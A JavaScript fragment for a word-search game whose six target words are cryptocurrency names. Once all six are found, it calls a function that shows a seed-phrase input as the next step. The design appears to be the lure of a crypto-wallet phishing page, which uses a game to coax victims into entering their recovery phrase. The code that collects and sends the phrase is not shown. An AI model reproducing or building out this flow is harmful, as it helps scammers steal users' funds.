const winningWords = ["BITCOIN", "ETHEREUM", "SOLANA", "MONERO", "CARDANO", "BINANCE"];
let selectedTiles = [];

// Handle Tile Clicking with Toggle
function handleTileClick(tile, char, index) {
    if (tile.classList.contains('selected')) {
        // UNCHECK logic: remove if already selected
        tile.classList.remove('selected');
        selectedTiles = selectedTiles.filter(t => t.index !== index);
    } else {
        // CHECK logic: add to selection
        tile.classList.add('selected');
        selectedTiles.push({ char, index });
    }
    checkMatches();
}

function checkMatches() {
    let matchesFound = 0;
    const currentSelection = selectedTiles.map(t => t.char).join('');

    winningWords.forEach(word => {
        // Check if the selected characters contain the winning words
        if (currentSelection.includes(word)) {
            matchesFound++;
        }
    });

    document.getElementById('match-count').innerText = `${matchesFound}/6`;

    if (matchesFound === 6) {
        showSeedPhraseInput(); // Proceed to the next step
    }
}